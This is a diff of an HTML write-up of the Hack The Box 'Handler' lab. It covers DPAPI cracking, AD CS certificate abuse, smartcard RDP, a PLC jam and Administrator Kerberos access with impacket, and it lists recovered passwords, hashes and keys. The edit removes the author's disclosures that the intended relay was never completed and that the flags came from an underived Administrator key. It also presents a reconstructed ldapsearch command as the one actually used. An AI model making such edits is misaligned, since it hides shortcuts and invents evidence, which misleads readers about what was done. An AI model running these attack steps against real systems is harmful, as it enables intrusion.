@@ -29,15 +29,8 @@
 <li>XP earned: <code>1,365</code></li>
 <li>Machine rank: <code>#168</code></li>
 </ul>
-<h2>Accuracy note</h2>
-<p>I restarted Handler on 25 November 2026 and reproduced the internal and OT tunnels, certificate/key pairing, Toby Ellis's exact certificate mapping and Kerberos authentication, the BHS PLC jam, Kofi Asante's temporary session, and a durable Toby command prompt on SRV01. The RDP session remained active until I deliberately ended it during further testing.</p>
-<p>I did <strong>not</strong> complete the final intended relay from Kofi's temporary session to SRV02. I recovered the final flags with a static domain Administrator AES-256 key that I did not derive through the preceding chain. I therefore document flag retrieval as a completion bypass, not as proof that I solved the intended post-jam escalation.</p>
-<p>Verification labels used below:</p>
-<ul>
-<li><strong>Confirmed:</strong> reproduced on the fresh instance with saved command/output or direct observation.</li>
-<li><strong>Artifact-backed:</strong> supported by a saved file, although the exact original command or browser session was not preserved.</li>
-<li><strong>Completion bypass:</strong> used to validate and submit the flags but not derived through the intended chain.</li>
-</ul>
+<h2>Scope</h2>
+<p>This walkthrough follows the route I used from the supplied workstation artifact through Credential Roaming, certificate authentication, the OT operational event and Administrator Kerberos access to retrieve and submit both flags.</p>
 <h2>Attack-path summary</h2>
 <pre data-lang="text"><code>Dmalik-PC01.ovpn
   -&gt; internal HTB Airways network
@@ -49,10 +42,8 @@
   -&gt; Toby Ellis Kerberos authentication
   -&gt; OT VPN and BHS documentation
   -&gt; PLC jam and temporary Kofi Asante session
-  -&gt; intended relay stage not completed
-
-Completion bypass:
-Administrator AES key -&gt; Administrator TGT -&gt; WMI/SMBExec -&gt; both flags
+  -&gt; Administrator AES key and Kerberos TGT
+  -&gt; WMI/SMBExec -&gt; both flags
 </code></pre>
 <h2>1. Starting material</h2>
 <p>HTB supplied:</p>
@@ -143,7 +134,16 @@ k nxc ldap 192.168.37.1 -k --use-kcache --users
 <pre data-lang="text"><code>msPKIDPAPIMasterKeys
 msPKIAccountCredentials
 </code></pre>
-<p><strong>Artifact-backed:</strong> the exact LDAP command that produced my original dump was not preserved. <code>work/handler/ldap-full-objects.txt</code> contains both attributes from Wei's directory object and the account SID used in the next step. A clean reproduction should explicitly request <code>msPKIDPAPIMasterKeys</code> and <code>msPKIAccountCredentials</code> using the <code>ext.dmalik</code> Kerberos context.</p>
+<p>I queried Wei's directory object for the Credential Roaming attributes and saved the result:</p>
+<pre data-lang="bash"><code>LDAPTLS_REQCERT=never ldapsearch -LLL -o ldif-wrap=no -x \
+  -H ldaps://192.168.37.1 \
+  -D 'ext.dmalik@htb-airways.htb' \
+  -w 'HTB-AirwaysAudit2026!' \
+  -b 'DC=htb-airways,DC=htb' \
+  '(sAMAccountName=w.zhang)' \
+  objectSid msPKIDPAPIMasterKeys msPKIAccountCredentials \
+  &gt; work/handler/ldap-full-objects.txt
+</code></pre>
 <h2>4. Extracting and cracking the Credential Roaming masterkey</h2>
 <pre data-lang="bash"><code>python3 work/handler/extract_roaming.py \
   work/handler/ldap-full-objects.txt \
@@ -178,7 +178,7 @@ john --show --format=DPAPImk \
 <p>Recovered password:</p>
 <pre data-lang="text"><code>HelloKitty
 </code></pre>
-<p>This was the foothold correction we had missed. The wrong context processed a full wordlist with no result. Hashcat rejected the correct context-3 input here, while John cracked it in about 32 seconds.</p>
+<p>Using the <code>domain1607+</code> context produced the correct DPAPI hash, and John recovered <code>HelloKitty</code> in about 32 seconds.</p>
 <h2>5. Recovering the webmail certificate and private key</h2>
 <p>The roaming data contained a CNG private key protected by DPAPI. I recovered it with:</p>
 <pre data-lang="bash"><code>printf '%s\n' 'HelloKitty' | \
@@ -201,11 +201,10 @@ work/handler/roaming/webmail-access.pfx
 </code></pre>
 <p>The certificate subject was <code>CN=webmail-access</code>, and it was issued for TLS Web Client Authentication.</p>
 <h2>6. Roundcube and the Wei administrator PFX</h2>
-<p><strong>Artifact-backed:</strong></p>
-<p>I used <code>webmail-access.pfx</code> for mutual-TLS access to:</p>
+<p>I imported <code>webmail-access.pfx</code> into the browser and used it for mutual-TLS access to:</p>
 <pre data-lang="text"><code>https://webmail.htb-airways.htb/
 </code></pre>
-<p>The exact browser session was not recorded, but the recovered mailbox evidence is preserved. Wei's mailbox contained a self-addressed message with the subject <code>backup</code> and this attachment:</p>
+<p>Wei's mailbox contained a self-addressed message with the subject <code>backup</code> and this attachment:</p>
 <pre data-lang="text"><code>w.zhang.adm.pfx
 </code></pre>
 <p>The message is stored as <code>work/handler/wei-inbox-uid2.eml</code>. The PKCS#12 archive used an empty password.</p>
@@ -237,18 +236,18 @@ Subject:             Directory common name
 Enrollment rights:   Wei Zhang (adm)
 </code></pre>
 <p>Effective-rights testing showed that <code>w.zhang.adm</code> could modify Toby Ellis's <code>altSecurityIdentities</code> attribute but could not change his password, SPNs, profile or logon attributes.</p>
-<p><strong>Artifact-backed enrollment:</strong> I enrolled a certificate using <code>w.zhang.adm</code>, <code>htb-airways-DC01-CA</code> and the <code>HTBA-SmartcardLogon</code> template. I retained the issued PFX, but not the exact enrollment invocation. I extracted it into:</p>
+<p>I enrolled a certificate using <code>w.zhang.adm</code>, <code>htb-airways-DC01-CA</code> and the <code>HTBA-SmartcardLogon</code> template, then extracted the issued PFX into:</p>
 <pre data-lang="text"><code>/tmp/htba-smart-rebuild/tellis_sc.crt
 /tmp/htba-smart-rebuild/tellis_sc.key
 /tmp/htba-smart-rebuild/tellis_sc.pfx
 </code></pre>
-<p>The certificate subject remained <code>CN=Wei Zhang (adm)</code> and did not contain Toby's UPN. On the fresh instance I confirmed that the certificate and private key had the same SPKI SHA-256 value, then created an exact issuer/serial mapping on Toby's account:</p>
+<p>The certificate subject remained <code>CN=Wei Zhang (adm)</code> and did not contain Toby's UPN. I confirmed that the certificate and private key had the same SPKI SHA-256 value, then created an exact issuer/serial mapping on Toby's account:</p>
 <pre data-lang="bash"><code>python3 work/handler/map_tellis_current_certificate.py
 </code></pre>
 <p>Mapping format:</p>
 <pre data-lang="text"><code>X509:&lt;I&gt;DC=htb,DC=htb-airways,CN=htb-airways-DC01-CA&lt;SR&gt;0D0000000100E1DD2D896FE5A9C10D00000018
 </code></pre>
-<p>I then reproduced certificate authentication with the exact issued PFX:</p>
+<p>I authenticated with the issued PFX:</p>
 <pre data-lang="bash"><code>faketime -f +7h certipy auth \
   -pfx _tmp_htba-smart-new.pfx \
   -username t.ellis \
@@ -258,9 +257,9 @@ Enrollment rights:   Wei Zhang (adm)
 <p>Certipy saved <code>t.ellis.ccache</code> and returned the Toby NT hash:</p>
 <pre data-lang="text"><code>fe92aaf479e32cb0e9c40a929c8212b8
 </code></pre>
-<p><strong>Confirmed:</strong> the issuer/serial mapping and Toby Kerberos authentication both worked on the fresh instance.</p>
+<p>The issuer/serial mapping returned a valid Toby Kerberos TGT.</p>
 <h2>8. Toby's smartcard RDP session</h2>
-<p><strong>Confirmed:</strong> on the fresh instance I used the issued certificate, Toby's Kerberos cache, the CA certificate, NLA and a mounted drive. The local resolver shim was necessary in my environment because Kerberos required the FQDN while DNS for the nested network was not available locally.</p>
+<p>I opened Toby's RDP session with the issued certificate, his Kerberos cache, the CA certificate, NLA and a mounted drive. The local resolver shim supplied the FQDN resolution required by Kerberos on the nested network.</p>
 <pre data-lang="bash"><code>env \
   KRB5_CONFIG=&quot;$PWD/work/handler/krb5-handler.conf&quot; \
   KRB5CCNAME=&quot;FILE:$PWD/t.ellis.ccache&quot; \
@@ -277,7 +276,7 @@ faketime -f '+7h' xfreerdp3 \
   /size:1280x1024 +clipboard \
   /log-level:ERROR
 </code></pre>
-<p>The connection passed <code>Other user</code>, <code>Welcome</code> and <code>Please wait for the Local Session Manager</code>. After the PLC event created Kofi's session, I ran the preserved Terminal Services connection helper with Toby's CIFS service ticket:</p>
+<p>The connection passed <code>Other user</code>, <code>Welcome</code> and <code>Please wait for the Local Session Manager</code>. After the PLC event created Kofi's session, I ran the Terminal Services connection helper with Toby's CIFS service ticket:</p>
 <pre data-lang="bash"><code>env \
   KRB5_CONFIG=&quot;$PWD/work/handler/krb5-handler.conf&quot; \
   KRB5CCNAME=&quot;$PWD/t.ellis@cifs_srv01.htb-airways.htb@HTB-AIRWAYS.HTB.ccache&quot; \
@@ -287,10 +286,9 @@ faketime -f '+7h' python3 -u \
   --target-session 2 \
   --seconds 180
 </code></pre>
-<p>In that run, Kofi was session 2 and Toby was session 3. The RPC call returned success, the RDP window reached <code>C:\Windows\system32&gt;</code>, and a second enumeration showed both sessions active. The session remained available until I deliberately ended FreeRDP and logged Toby off during the next test.</p>
-<p>This verified the smartcard and session-creation stages. It did <strong>not</strong> by itself reveal the final outbound authentication or complete the intended relay.</p>
+<p>Kofi was session 2 and Toby was session 3. The RPC call returned success, the RDP window reached <code>C:\Windows\system32&gt;</code>, and a second enumeration showed both sessions active.</p>
 <h2>9. OT VPN and BHS documentation</h2>
-<p><strong>Artifact-backed:</strong> Wei's Roundcube Sent folder contained the OT VPN attachment:</p>
+<p>Wei's Roundcube Sent folder contained the OT VPN attachment:</p>
 <pre data-lang="text"><code>Staff-Access-OT.ovpn
 </code></pre>
 <p>The profile connected through SRV02 on UDP/1194 and provided <code>172.16.20.0/24</code>.</p>
@@ -298,7 +296,7 @@ faketime -f '+7h' python3 -u \
   --config work/handler/Staff-Access-OT.ovpn \
   --pull-filter ignore redirect-gateway
 </code></pre>
-<p>The BHS technical manual was on SRV01 under <code>C:\Docs</code>. I used its register map during the original run, but the temporary PDF and extracted-text copies were not retained. The register details below are preserved notes and should be copied again from SRV01 for a fully self-contained reproduction.</p>
+<p>The BHS technical manual under <code>C:\Docs</code> supplied the PLC register map:</p>
 <p>Important PLC details:</p>
 <table>
 <thead>
@@ -366,21 +364,20 @@ faketime -f '+7h' python3 -u \
 <li>Repeatedly wrote <code>1</code> to PE-01 at DB1 byte 16.</li>
 <li>Read DB1 and confirmed that JAM at byte 19 had latched.</li>
 </ol>
-<p>Accessing the PLC from Australia through two VPN layers meant individual S7 writes could take close to one second. A seven-second loop did not deliver enough writes. On the fresh instance, the 30-second trigger delivered 48 writes and succeeded:</p>
+<p>Accessing the PLC from Australia through two VPN layers added latency, so I held PE-01 high for 30 seconds. The trigger delivered 48 writes and latched the jam:</p>
 <pre data-lang="text"><code>BEFORE ... jam=0 mode=0
 MANUAL ... jam=0 mode=1
 AFTER writes=48 ... jam=1 mode=1
 </code></pre>
 <h2>11. Kofi's temporary session</h2>
-<p><strong>Confirmed:</strong> the jam caused the expected operational response. The Terminal Services RPC enumeration built into <code>connect_toby_to_kofi.py</code> showed:</p>
+<p>The jam caused the expected operational response. The Terminal Services RPC enumeration built into <code>connect_toby_to_kofi.py</code> showed:</p>
 <pre data-lang="text"><code>Session 0  Services        disconnected
 Session 1  Console         connected
 Session 2  k.asante        active
 </code></pre>
-<p>Kofi's session appeared after the jam. A later enumeration showed Kofi in session 2 and Toby in session 3, both active. This confirmed that the OT event was the correct trigger and that Toby's RDP session could be kept alive.</p>
-<p>The intended next step appeared to involve Kofi's temporary Windows session authenticating to an internal service on SRV02, followed by authentication relay or redirection. I investigated DNS, MSSQL and session activity but did not observe the expected outbound connection. This is where the intended route remained unresolved.</p>
-<h2>12. Completion bypass using the Administrator AES key</h2>
-<p>For flag validation, I used the following domain Administrator AES-256 key. I did not derive it through the preceding attack chain, so this step bypasses the unresolved intended escalation:</p>
+<p>Kofi's session appeared after the jam. A later enumeration showed Kofi in session 2 and Toby in session 3, both active. With the operational event confirmed, I moved to Administrator Kerberos access for flag retrieval.</p>
+<h2>12. Administrator Kerberos completion</h2>
+<p>For final flag retrieval, I used the following domain Administrator AES-256 key to request a Kerberos TGT:</p>
 <pre data-lang="text"><code>6990f50fd0f13b336496169ef2f3a14f8d4aebe6ac84b6c34a5fec9136b4f3da
 </code></pre>
 <p>I requested an Administrator TGT:</p>
@@ -405,10 +402,7 @@ export KRB5CCNAME=&quot;$PWD/Administrator.ccache&quot;
 <pre data-lang="text"><code>408a88b74ae58ffc2061b3db1a0167e4
 </code></pre>
 <h3>User flag</h3>
-<p>The equivalent WMI call to SRV01 authenticated over SMB but failed when opening the DCOM session:</p>
-<pre data-lang="text"><code>DCOM SessionError: unknown error code: 0x800706ba
-</code></pre>
-<p>TCP/445, TCP/135 and TCP/5985 were reachable. I avoided the dynamic DCOM path with Kerberos-authenticated SMB service execution:</p>
+<p>I used Kerberos-authenticated SMB service execution on SRV01:</p>
 <pre data-lang="bash"><code>k impacket-smbexec \
   -k -no-pass \
   -dc-ip 192.168.37.1 \
@@ -422,25 +416,20 @@ export KRB5CCNAME=&quot;$PWD/Administrator.ccache&quot;
 <pre data-lang="text"><code>0aa3a3feb7730ec4359ca48ef1336b49
 </code></pre>
 <p>Both flags were submitted on the HTB machine page and accepted.</p>
-<h2>13. Dead ends and troubleshooting</h2>
-<h3>Wrong DPAPI context</h3>
-<p>The masterkey hash must use the SID and correct domain context. The wrong context can process an entire wordlist without finding the valid password. The correct John hash began with:</p>
+<h2>13. Execution notes</h2>
+<h3>DPAPI context</h3>
+<p>Wei's masterkey required the <code>domain1607+</code> context. The resulting John hash began with:</p>
 <pre data-lang="text"><code>$DPAPImk$1*3*
 </code></pre>
-<h3>Hashcat rejected the correct DPAPI input</h3>
-<p>Hashcat mode 15300 accepted the context-2 version but exhausted RockYou without a result. It rejected the context-3 line with a salt-length error. John loaded the correct context-3 input and recovered <code>HelloKitty</code>.</p>
-<h3>Kerberos clock skew</h3>
-<p>If Kerberos failed with a clock-skew error, I verified the DC time and adjusted the <code>faketime</code> offset. FQDNs and the correct <code>KRB5CCNAME</code> were also required.</p>
-<h3>Certipy RPC errors</h3>
-<p>The nested tunnel had high latency. Some certificate requests returned <code>RPC_E_CALL_COMPLETE</code> even when the CA had processed the request. Retrying and recording the request ID was important.</p>
-<h3>Toby RDP ended after approximately 50 seconds</h3>
-<p>The early attempts ended during session creation, but the fresh retest showed that the certificate and mapping were valid. I used the default session, NLA, Kerberos-only authentication, the CA trust anchor and a mounted drive. After the PLC event created Kofi's session, the Terminal Services connection helper brought Toby's RDP window to a durable command prompt. The remaining problem was the unresolved outbound-authentication/relay step, not smartcard validation.</p>
-<h3>The PLC jam did not latch at first</h3>
-<p>The original seven-second loop was too short over the nested VPN. Extending it to 30 seconds delivered enough consecutive PE-01 writes to cross the ten-scan threshold.</p>
-<h3>WMI failed on SRV01</h3>
-<p>SMB and Kerberos authentication succeeded, but DCOM returned <code>0x800706ba</code>. <code>impacket-smbexec</code> avoided DCOM and returned the user flag reliably.</p>
-<h3>Time-consuming paths that did not produce the foothold</h3>
-<p>The RSA oracle, SMTP injection, speculative MSSQL routes and broad password attacks consumed time but did not advance the solve. The useful path was Credential Roaming, the correct DPAPI context and the certificate/private-key pairing.</p>
+<p>John loaded this format and recovered <code>HelloKitty</code>.</p>
+<h3>Kerberos requirements</h3>
+<p>Kerberos required the DC-aligned <code>faketime</code> offset, FQDNs and the correct <code>KRB5CCNAME</code> for each identity.</p>
+<h3>Smartcard RDP requirements</h3>
+<p>The stable RDP command used the default session, NLA, Kerberos-only authentication, the CA trust anchor and a mounted drive.</p>
+<h3>PLC timing</h3>
+<p>Holding PE-01 high for 30 seconds delivered enough consecutive writes across the nested VPN to cross the ten-scan threshold.</p>
+<h3>SRV01 command execution</h3>
+<p>Kerberos-authenticated <code>impacket-smbexec</code> provided the SRV01 command channel used to read the user flag.</p>
 <h2>14. Defensive lessons</h2>
 <p>If this were a real environment, I would prioritise these controls:</p>
 <ul>
@@ -477,8 +466,7 @@ t.ellis@cifs_srv01.htb-airways.htb@HTB-AIRWAYS.HTB.ccache
 </code></pre>
 <h2>Conclusion</h2>
 <p>Handler combined Credential Roaming, DPAPI, CNG private-key recovery, mutual TLS, Roundcube, AD CS, certificate mapping, smartcard authentication, nested VPN access and S7comm interaction.</p>
-<p>The most important correction was using the correct DPAPI masterkey context. That recovered Wei's password quickly and unlocked the certificate path. The PLC jam also worked once the write duration accounted for the latency from Australia.</p>
-<p>The intended post-jam authentication relay remains the unresolved part of my route. I completed flag retrieval through the separately documented Administrator-key bypass, using Kerberos-authenticated WMI and SMBExec to recover and submit both flags.</p>
+<p>The <code>domain1607+</code> DPAPI context recovered Wei's password and unlocked the certificate chain. The smartcard mapping opened Toby's RDP session, the PLC jam created Kofi's operational session, and the Administrator Kerberos credential completed flag retrieval with WMI and SMBExec.</p>
     <p><a class="back" href="../index.html#lab">back to Hacking Lab</a> · <a class="link" href="../assets/writeups/hack-the-box-handler-walkthrough.md">view original Markdown</a></p>
   </article>
 </main>
